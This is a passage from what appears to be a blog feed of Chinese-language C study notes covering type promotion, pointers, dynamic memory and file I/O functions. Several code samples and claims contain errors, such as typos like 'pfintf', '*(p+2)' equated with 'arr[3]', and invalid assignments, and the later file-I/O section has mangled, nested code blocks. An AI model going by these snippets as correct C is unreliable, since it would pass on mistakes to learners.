class="hljs-comment">//a=00000011</span><br>    <span class="hljs-type">char</span> b=<span class="hljs-number">127</span>;<br>    <span class="hljs-comment">//b=01111111</span><br>    <span class="hljs-type">char</span> c=a+b;<span class="hljs-comment">//相加转换为整形</span><br>    <span class="hljs-comment">//a=00000000000000000000000000000011</span><br>    <span class="hljs-comment">//b=00000000000000000000000001111111</span><br>    <span class="hljs-comment">//c=11111111111111111111111110000010</span><br>    <span class="hljs-comment">//根据符号数补齐</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,c);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure></li><li><p>算术运算：将低精度的转换为高精度的</p></li></ul></li><li><p>操作符的属性</p><ul><li>优先级：优先级高的先算</li><li>结合性：</li><li>求值顺序:</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初始指针</title>
    <link href="/2023/04/20/C/%E5%88%9D%E5%A7%8B%E6%8C%87%E9%92%88/"/>
    <url>/2023/04/20/C/%E5%88%9D%E5%A7%8B%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<h1 id="初始指针"><a href="#初始指针" class="headerlink" title="初始指针"></a>初始指针</h1><h2 id="what-is-指针"><a href="#what-is-指针" class="headerlink" title="what is 指针"></a>what is 指针</h2><ol><li>指针描述了数据在内存中的位置</li><li>指针也就是内存地址</li><li>一个内存单元为一个字节</li><li>指针在32位平台是4个字节，在64位平台是8个字节</li></ol><h2 id="指针的意义"><a href="#指针的意义" class="headerlink" title="指针的意义"></a>指针的意义</h2><ol><li><p>指针的类型决定了，指针解引用的权限有多大</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//例如</span><br><span class="hljs-type">char</span>*<span class="hljs-comment">//可以指1个字节</span><br><span class="hljs-type">int</span>*<span class="hljs-comment">//可以指4个字节</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="取地址运算"><a href="#取地址运算" class="headerlink" title="取地址运算"></a>取地址运算</h2><ol><li><p>&amp;：取地址后的，需要用%p输出，如果用%x（16进制），则会警告</p><ul><li><p>只有明确的变量才能取他的地址</p></li><li><p>本地变量存放在堆栈的地方，内存地址由高到底</p></li></ul></li><li><p>指针变量：用于记录地址的变量 </p></li><li><p>int* p,q只将p设成指针，q只是普通变量</p></li><li><p>指针用于，函数的传址，当函数需要返回多个值时，需要用指针带回</p></li></ol><h2 id="指针与函数"><a href="#指针与函数" class="headerlink" title="指针与函数"></a>指针与函数</h2><ol><li><p>传入函数的数组，函数接收到的是函数第一个数的地址,函数中设置接受的数组时，就是设置了指针<code>数组变量是特殊的指针</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">minmax</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[])</span><span class="hljs-comment">//这里</span><br>&#123;<br>    arr[<span class="hljs-number">0</span>]=<span class="hljs-number">11</span>;<br>&#125;<br><span class="hljs-comment">//上面的函数还可以设置成</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">minmax2</span><span class="hljs-params">(<span class="hljs-type">int</span>* a)</span><br>&#123;<br>    a[<span class="hljs-number">0</span>]=<span class="hljs-number">11</span>;<span class="hljs-comment">//与上面结果一致</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> arr[]=&#123;&#125;;<br>    minmax(arr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,arr[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br> <span class="hljs-comment">//结果是11，因为设置函数时，用了int arr实际上是设置了指针   </span><br></code></pre></td></tr></table></figure><ul><li>因此在使用数组作为函数变量时，有两种方法：<ul><li>int arr</li><li>int* a</li></ul></li><li>arr的地址也就是arr[0]的地址</li></ul></li><li><p>数组变量是<code>const</code>（限定的变量不允许被改变）的指针，所以不能被赋值，数组之间也不能互相赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//例子：</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">int</span> b[]=&#123;&#125;;<br>    a=b;<span class="hljs-comment">//不能这样写</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="指针与const"><a href="#指针与const" class="headerlink" title="指针与const"></a>指针与<code>const</code></h2><ol><li><p>指针可以是<code>const</code>,修饰的值也可能是<code>const</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> *p=&amp;i;<br>*p=<span class="hljs-number">25</span>;<span class="hljs-comment">//因为使用const修饰p所以不能再使用，*对i进行修改</span><br><span class="hljs-comment">//但是可以通过，直接对i进行修改</span><br></code></pre></td></tr></table></figure></li><li><p>判断被<code>const</code>的标志</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">int</span>* p1=&amp;i;<br><span class="hljs-type">int</span> <span class="hljs-type">const</span> *p2=&amp;i;<br><span class="hljs-comment">//第一个和第二个是一样的，const在*的前面，表示所指的东西不能被修改，const在*的后面表示指针不能被修改</span><br></code></pre></td></tr></table></figure></li><li><p><code>const</code>修饰数组表示，数组里面的每一个元素都被<code>const</code></p></li></ol><h2 id="指针的运算"><a href="#指针的运算" class="headerlink" title="指针的运算"></a>指针的运算</h2><ol><li>指针+1，增加一个指针所指的类型，同理对n也有意义，对-也有意义，减出的结果是，差n个指针所指的类型（元素个数）</li></ol>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span>* p=&amp;a;<br>pfintf(<span class="hljs-string">&quot;p=%d&quot;</span>,p);<br>pfintf(<span class="hljs-string">&quot;p+1=%d&quot;</span>,p+<span class="hljs-number">1</span>);<span class="hljs-comment">//p+1为p+4,因为p增加了一个int 的大小</span><br><span class="hljs-type">char</span> b=<span class="hljs-number">0</span>;<br><span class="hljs-type">char</span>*q=&amp;b;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;q=%d&quot;</span>,q);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;q+1=%d&quot;</span>,q+<span class="hljs-number">1</span>);<span class="hljs-comment">//q+1为q+1,因为q增加了一个char的大小</span><br></code></pre></td></tr></table></figure>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> ac[]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">45</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>&#125;;<br><span class="hljs-type">char</span> *p=ac;<br><span class="hljs-comment">//*p-&gt;ac[0]</span><br><span class="hljs-comment">//*(p+1)-&gt;ac[1]</span><br></code></pre></td></tr></table></figure><ol start="2"><li>如果地址加1就没有实际意义</li><li>0地址， 是不能随便触碰的地址如果使用NULL效果和0地址一样，有些编译器，若果强制使用0地址，则可以用NULL </li><li>指针和指针相减的前提是两个指针指向同一个指针</li><li>指针加指针没有什么意义</li></ol><h2 id="指针的类型转换"><a href="#指针的类型转换" class="headerlink" title="指针的类型转换"></a>指针的类型转换</h2><ol><li>强制类型转换，可以用于指针的赋值</li></ol><h2 id="指针的用处需要传入较大的数据用作参数"><a href="#指针的用处需要传入较大的数据用作参数" class="headerlink" title="指针的用处需要传入较大的数据用作参数"></a>指针的用处需要传入较大的数据用作参数</h2><ol><li><p>传入数组对数组操作</p></li><li><p>函数返回不止一个结果</p></li><li><p>用函数修改不止一个变量</p></li><li><p>动态申请内存</p></li></ol><h2 id="动态内存分布"><a href="#动态内存分布" class="headerlink" title="动态内存分布"></a>动态内存分布</h2><ol><li><p><code>malloc</code>:库函数为<code>&lt;stdlib.h&gt;</code></p><ul><li><p>向<code>malloc</code>申请的空间的大小是以字节为单位的，返回的结果是<code>void*</code>,需要类型转换为自己需要的类型</p></li><li><p>同时需要使用，<code>free（）</code>将地址归还，括号里面填存储地址的变量，可以使用free(NULL)</p></li><li><p>如果申请失败的话就会返回0或者NULL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> number;<br>    <span class="hljs-type">int</span>* a;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入空间大小&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;number);<br>    a=(<span class="hljs-type">int</span>*)<span class="hljs-built_in">malloc</span>(number*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-comment">//第一个int*是将malloc返回值强制转换为int*,因为a是int*</span><br>    <span class="hljs-comment">//(number*sizeof(int)),*指的是乘法,number,是我们想要的大小,但是需要×相应的类型才能得到,</span><br>    <span class="hljs-built_in">free</span>(a);<span class="hljs-comment">//使用malloc需要归还</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>使用<code>malloc</code>常见问题</p><ul><li>使用了<code>malloc</code>没有free</li><li>错过了free的时机</li><li><code>free</code>再<code>free</code></li></ul></li></ol><h2 id="野指针"><a href="#野指针" class="headerlink" title="野指针"></a>野指针</h2><ol><li><p>指针指向的位置是不可知的为野指针</p></li><li><p>造成原因</p><ul><li><p>指针没有初始化</p><ul><li>指针的初始化为NULL</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *i;<br>*i=<span class="hljs-number">20</span>;<br><span class="hljs-comment">//这里i 就是野指针</span><br><span class="hljs-comment">//因为i没有初始化，局部变量i默认为随机值，随机的位置来访问i,也就是非法访问</span><br><br></code></pre></td></tr></table></figure></li><li><p>指针越界也会造成野指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> arr[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span>* p =arr;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)<br>    &#123;<br>        *p=i;<br>        p++;<span class="hljs-comment">//这里需要循环10次，但是第10次的时候已经越界，这时候是野指针</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>指针指向的空间释放</p></li></ul></li><li><p>如何有效规避野指针</p><ul><li>指针初始化NULL</li><li>小心指针的越界</li><li>指针指向空间及时释放指针为NULL</li><li>检查指针的有效性</li></ul></li><li><p>空指针没有权限使用</p><ul><li><p>使用指针时，最好判断是否为NULL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *p=<span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span>（p!=<span class="hljs-literal">NULL</span>）<br>&#123;<br>    *p=<span class="hljs-number">20</span>;<br>&#125;<span class="hljs-comment">//最好判断一下，可以减少代码出错</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><h2 id="指针的标准"><a href="#指针的标准" class="headerlink" title="指针的标准:"></a>指针的标准:</h2><blockquote><p>允许指向数组元素的指针指向数组后面一个地址，不允许指向前面一个地址</p></blockquote><ol><li><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> count 5</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> arr[count]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> *p=<span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> i=count;<br><span class="hljs-keyword">for</span>(p=&amp;arr[count];p&gt;&amp;arr[<span class="hljs-number">0</span>];)<br>&#123;<br>--i;<br>*--p=i;<br>        <span class="hljs-comment">//先--，再解引用</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d,%d\n&quot;</span>,arr[i],*p);<br>        <br>  &#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="指针和数组"><a href="#指针和数组" class="headerlink" title="指针和数组"></a>指针和数组</h2><ol><li><p>数组名：是数组首元素的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> arr[<span class="hljs-number">10</span>];<br><span class="hljs-type">int</span> *p=arr;<br><span class="hljs-comment">//*(p+2)&lt;==&gt;arr[3]&lt;==&gt;*(2+p)&lt;==&gt;*(2+arr)&lt;==&gt;*(arr+2)&lt;==&gt;2[arr]&lt;==&gt;p[2]</span><br><span class="hljs-comment">//因为编译器在编译的时候，将arr[2]--&gt;*（arr+2）,所以我们可以运用交换率，arr[2]=2[arr]</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="二级指针"><a href="#二级指针" class="headerlink" title="二级指针"></a>二级指针</h2><ol><li><p>指向指针的指针，被称作为二级指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a=<span class="hljs-number">8</span>;<br><span class="hljs-comment">//int为a的类型</span><br><span class="hljs-type">int</span> *pa=&amp;a;<br><span class="hljs-comment">//*为指针变量，int 为a的类型</span><br><span class="hljs-type">int</span>* *ppa=&amp;pa;<span class="hljs-comment">//ppa是二级指针变量</span><br><span class="hljs-comment">//第二个*为指针变量，第一个int*为pa的类型</span><br>inte***pppa=&amp;ppa;<br><span class="hljs-comment">//三级指针</span><br></code></pre></td></tr></table></figure></li><li><p>使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">*pa=a;<br>*ppa=pa;<br>**ppa=a;<br></code></pre></td></tr></table></figure></li></ol><h2 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h2><ol><li><p>存放指针的数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* parr[<span class="hljs-number">10</span>];<span class="hljs-comment">//指针数组，cun&#x27;f</span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件操作</title>
    <link href="/2023/04/20/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <url>/2023/04/20/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="什么是文件"><a href="#什么是文件" class="headerlink" title="什么是文件"></a>什么是文件</h2><ol><li><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221111215431353.png" alt="image-20221111215431353"></li><li>数据文件<ul><li>存放程序运行时需要读取的数据</li></ul></li><li>文件名<ul><li>文件名包含：文件路径+文件主干+文件后缀</li><li><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221111215955712.png" alt="image-20221111215955712"></li></ul></li></ol><h2 id="文件的打开和关闭"><a href="#文件的打开和关闭" class="headerlink" title="文件的打开和关闭"></a>文件的打开和关闭</h2><ol><li>文件指针：指向文件地址</li><li>文件信息区：在内存中开辟的名为<code>FILE</code>的结构体变量(由系统声明)</li><li>通过使用<code>FILE*</code>指针来维护FILE结构体</li><li><code>fopen()</code>函数和:</li><li><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221111221059403.png"></li><li><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221111221754676.png" alt="image-20221111221754676"></li></ol><blockquote><p><code>filename</code>:文件名</p><p><code>mode</code>:打开方式</p><p><code>fopen</code>:打开文件</p><p><code>fclose</code> :关闭文件</p></blockquote><ol start="7"><li>打开文件的方式<ul><li><img src="C:\Users\12414\Desktop\C语言笔记\文件操作\文件操作.assets\image-20221112084050171.png"></li></ul></li></ol><h2 id="文件的读写与关闭"><a href="#文件的读写与关闭" class="headerlink" title="文件的读写与关闭"></a>文件的读写与关闭</h2><ol><li><p>相关函数：</p><ul><li><img src="C:\Users\12414\Desktop\C语言笔记\文件操作\文件操作.assets\image-20221112084625654.png" alt="image-20221112084625654"></li></ul></li><li><p>输入：指从内存中写入到硬盘</p></li><li><p>输出：指从硬盘读取到内存中</p></li><li><p><code>perror</code>():C 库函数 <code>void perror(const char \*str)</code> 把一个描述性错误消息输出到标准错误 <code>stderr</code>。首先输出字符串 <code>str</code>，后跟一个冒号，然后是一个空格。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE* pr=fopen(<span class="hljs-string">&quot;chg.tet&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">if</span>(pr==<span class="hljs-literal">NULL</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;fopen&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\12414\Desktop\C语言笔记\文件操作\文件操作.assets\image-20221112091903125.png" alt="image-20221112091903125"></p></li><li><p><code>fputc（&#39;char&#39;,流的指针）</code>:写一个数据到流里面去</p></li><li><p><code>fgetc</code>:当文件读取正常，返回的是字符的<code>ASCLL</code>码值是个整形，读取错误（读取完成）则返回的是<code>EOF(-1)</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>FILE* pr;<br><span class="hljs-type">int</span> ret;<br><span class="hljs-comment">//打开文件</span><br>pr=fopen(<span class="hljs-string">&quot;chg.tet&quot;</span>,<span class="hljs-string">&quot;r+&quot;</span>);<br><span class="hljs-comment">//文件的判断</span><br><span class="hljs-keyword">if</span>(pr==<span class="hljs-literal">NULL</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;fopen:&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//文件写入</span><br><span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;c&quot;</span>,pr);<br><span class="hljs-comment">//文件读取</span><br>rewind(pr);<br>ret=fgetc(pr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,ret);<br><span class="hljs-comment">//关闭文件</span><br>fclose(pr);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>fputs</code>:写一个字符串</p><ul><li><pre><code class="c">fputs(&quot;chg,tsy\n&quot;,pr);<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>     <br><br><span class="hljs-number">8</span>. `fgets`:读一个字符串<br><br>   - ```c<br>     fgets(arr,<span class="hljs-number">4</span>,pr)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="c">int main()&#123;    FILE* pr=NULL;    char arr[10];    //文件的创建    pr=fopen(&quot;chg.tet&quot;,&quot;r+&quot;);    //文件的判断    if(pr==NULL)    &#123;        perror(&quot;fopen:&quot;);        return 1;    &#125;    //第一次文件操作    fputs(&quot;chgchg&quot;,pr);    rewind(pr);    fgets(arr,7,pr);    printf(&quot;%s\n&quot;,arr);    //第二次文件操作    rewind(pr);    fputs(&quot;tsytsy&quot;,pr);    rewind(pr);    fgets(arr,7,pr);    printf(&quot;%s\n&quot;,arr);    //文件的关闭    fclose(pr);    return 0;&#125;<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br>## 结构体数据存储<br><br><span class="hljs-number">1.</span> `<span class="hljs-built_in">fprintf</span>()`:<br><br>   ```<span class="hljs-function">c</span><br><span class="hljs-function">   <span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function">   </span>&#123;<br>   <span class="hljs-comment">//创建文件</span><br>   FILE* pr = <span class="hljs-literal">NULL</span>;<br>   pr = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;chg.txt&quot;</span>, <span class="hljs-string">&quot;r+&quot;</span>);<br>   <br>   stu stu1;<br>   <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s%s&quot;</span>, stu1.number, stu1.name);<br>   <span class="hljs-comment">//文件的判断</span><br>   <span class="hljs-keyword">if</span> (pr == <span class="hljs-literal">NULL</span>)<br>   &#123;<br>   <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;fopen:&quot;</span>);<br>   <span class="hljs-keyword">return</span>  <span class="hljs-number">1</span>;<br>   &#125;<br>   <span class="hljs-comment">//文件的写入</span><br>   <span class="hljs-built_in">fprintf</span>(pr, <span class="hljs-string">&quot;number:%s\tname:%s&quot;</span>, stu1.number, stu1.name);<br>   <span class="hljs-built_in">rewind</span>(pr);<br>   <span class="hljs-comment">//关闭文件</span><br>   <span class="hljs-built_in">fclose</span>(pr);<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>   &#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li><p><code>fscanf()</code>:成功返回1</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">//创建文件</span><br>FILE* pr = <span class="hljs-literal">NULL</span>;<br>pr = fopen(<span class="hljs-string">&quot;chg.txt&quot;</span>, <span class="hljs-string">&quot;r+&quot;</span>);<br><br>stu stu1 = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s%s&quot;</span>, stu1.number, stu1.name);<br><span class="hljs-comment">//文件的判断</span><br><span class="hljs-keyword">if</span> (pr == <span class="hljs-literal">NULL</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;fopen:&quot;</span>);<br><span class="hljs-keyword">return</span>  <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//文件的写入</span><br><span class="hljs-built_in">fprintf</span>(pr, <span class="hljs-string">&quot;number:%s\tname:%s&quot;</span>, stu1.number, stu1.name);<br><span class="hljs-comment">//文件的读取</span><br>rewind(pr);<br>stu1.number[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;123&quot;</span>;<br>stu1.name[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;00000&quot;</span>;<br><span class="hljs-built_in">fscanf</span>(pr, <span class="hljs-string">&quot;number:%s\tname:%s&quot;</span>, &amp;stu1.number,&amp;stu1.name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number:%s\tname:%s&quot;</span>, stu1.number, stu1.name);<br><span class="hljs-comment">//关闭文件</span><br>fclose(pr);<br>pr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二进制写入："><a href="#二进制写入：" class="headerlink" 